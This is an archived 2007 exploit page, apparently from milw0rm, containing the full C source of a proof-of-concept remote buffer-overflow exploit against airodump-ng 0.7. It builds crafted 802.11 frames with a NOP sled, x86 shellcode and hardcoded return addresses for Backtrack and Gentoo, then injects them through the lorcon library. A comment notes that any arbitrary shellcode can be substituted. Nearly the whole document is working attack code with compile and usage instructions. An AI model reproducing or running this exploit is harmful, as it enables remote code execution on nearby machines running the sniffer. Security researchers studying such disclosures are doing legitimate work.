<html><head><title>Aircrack-ng 0.7 (specially crafted 802.11 packets) Remote BoF Exploit</title></head><pre>/**
 * airodump-exp.c - aircrack/airodump-ng (0.7) remote exploit
 *
 * Proof of concept exploit for a stack (and heap) based
 * overflow in airodump-ng.  The vulnerability can be exploited
 * by transmitting some specially crafted 802.11 packets to
 * execute arbitrary code on any machines within range
 * that are sniffing with a vulnerable version of airodump-ng.
 *
 * This exploit requires the lorcon 802.11 packet injection
 * library, see http://802.11ninja.net for details.
 *
 * Compiling:
 *
 *   gcc -o airodump-remote airodump-remote.c -lorcon
 *
 * Usage:
 *
 *   ./airodump-ng &lt;interface&gt; &lt;driver&gt; &lt;channel&gt; &lt;headertype&gt; [return addr]
 *
 * Drivers supported by lorcon:
 *
 *   wlan-ng, hostap, airjack, prism54, madwifing, madwifiold,
 *   rtl8180, rt2570, rt2500, rt73, rt61, zd1211rw
 *
 * Header types:
 *
 *   0 - None (not tested)
 *   1 - Fake prism54 header
 *   2 - Fake radiotap header (not tested)
 *
 * Return addresses:
 *
 *   Backtrack Linux 2 (2.6.20) aircrack-ng 0.7 - 0x8054934
 *   Gentoo Linux (2.6.16) aircrack-ng 0.7 - 0x8055934
 *
 * Example usage:
 *
 *   ./airodump-ng wlan0 prism54 11 1 0x8054934
 *
 * Original advisory: http://www.nop-art.net/advisories/airodump-ng.txt
 * Author: Jonathan So [ jonny [ @ ] nop-art.net ]
 *
 * Copyright (C) 2007 Jonathan So
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;tx80211.h&gt;

// Linux x86 sys_write shellcode.  Any arbitrary shellcode should work
// here, it doesn't matter if it contains nulls.  Maximum 792 bytes.

char shellcode[] = &quot;\xeb\x14&quot;                      // jmp get_message

                                                 // start:
                 &quot;\x59\x31\xdb\x31\xd2\xb2&quot;
                 &quot;\x1b&quot;                          // message length
                 &quot;\x31\xc0\x88\x04\x11&quot;
                 &quot;\xb0\x04\xcd\x80&quot;              // sys_write
                 &quot;\xb0\x01\xcd\x80&quot;              // sys_exit

                                                 // get_message:
                 &quot;\xe8\xe7\xff\xff\xff&quot;          // call start
                 &quot;Stop sniffing our network!!&quot;;  // message text

int main(int argc, char **argv)
{
  tx80211_t tx;
  tx80211_packet_t txp;
  uint8_t packet[1044];
  uint8_t *ppacket;

  int headertype;
  unsigned ret_addr = 0x8054934;
  FILE *fp;

  if(argc&lt;5) {
      printf(&quot;usage: %s &lt;interface&gt; &lt;driver&gt; &lt;channel&gt; &lt;arptype&gt;
[ret_addr]\n&quot;, argv[0]);
      exit(1);
  }

  if(argc&gt;5) {
      ret_addr = strtoul(argv[5], NULL, 16);
  }

  headertype = atoi(argv[4]);

  if ( tx80211_init(&amp;tx, argv[1], tx80211_resolvecard(argv[2])) !=
TX80211_ENOERR) {
      fprintf(stderr, &quot;Error initializing driver&quot;);
      return 1;
  }

  if (tx80211_setfunctionalmode(&amp;tx, TX80211_FUNCMODE_INJMON) !=
TX80211_ENOERR) {
      fprintf(stderr, &quot;Error setting inject mode\n&quot;);
      return 1;
  }

  if (tx80211_setchannel(&amp;tx, atoi(argv[3])) &lt; 0) {
              fprintf(stderr, &quot;Error setting channel\n&quot;);
  }

  if (tx80211_open(&amp;tx) &lt; 0) {
      fprintf(stderr, &quot;Unable to open interface\n&quot;);
      return 1;
  }

  txp.packet = packet;

  // Fill packet with nops
  memset(packet, 0x90, sizeof(packet));

  switch (headertype) {
      case 0:
          // No arptype, just send raw packet
          ppacket = packet;
          break;
      case 1:
          // Send fake prism header
          memcpy(packet+4, &quot;\x08\x00\x00\x00&quot;, 4);
          ppacket = packet + 8;
          break;
      case 2:
          // Send fake radiotap header
          packet[0] = 0;
          packet[2] = 3;
          ppacket = packet + 3;
          break;
      default:
          printf(&quot;Invalid header type. Valid options are:\n&quot;);
          printf(&quot;  0 - none\n&quot;);
          printf(&quot;  1 - prism54\n&quot;);
          printf(&quot;  2 - radiotap\n&quot;);
          return 1;
  }

  // set some necessary 802.11 header fields
  ppacket[0] = 0xB0;
  ppacket[1] = 0;
  ppacket[24] = 1;
  ppacket[25] = 0;
  ppacket[26] = 2;
  ppacket[27] = 0;

  txp.plen = 512 + (ppacket - packet);
  if (tx80211_txpacket(&amp;tx, &amp;txp) &lt; txp.plen) {
      fprintf(stderr, &quot;Error sending packet 1\n&quot;);
      return 1;
  }

  ppacket[26] = 4;

  if (tx80211_txpacket(&amp;tx, &amp;txp) &lt; txp.plen) {
      fprintf(stderr, &quot;Error sending packet 2\n&quot;);
      return 1;
  }

  // Insert shellcode at end of nopsled
  memcpy(ppacket+(820-sizeof(shellcode)), shellcode, sizeof(shellcode));

  // Overwrite some char*, needs to be a valid address
  memcpy(ppacket+1028, &amp;ret_addr, 4);

  // Overwrite global variable sk_len, used as argument to memcpy
  memcpy(ppacket+1032, &quot;\x20\x05\x00\x00&quot;, 4);

  // Return address
  memcpy(ppacket+820, &amp;ret_addr, 4);

  ppacket[1] = 0x40;
  txp.plen = 1036 +  + (ppacket - packet);

  if (tx80211_txpacket(&amp;tx, &amp;txp) &lt; txp.plen) {
      fprintf(stderr, &quot;Error sending packet 3\n&quot;);
      return 1;
  }

  tx80211_close(&amp;tx);

  return 0;
}

// milw0rm.com [2007-04-12]</pre></html>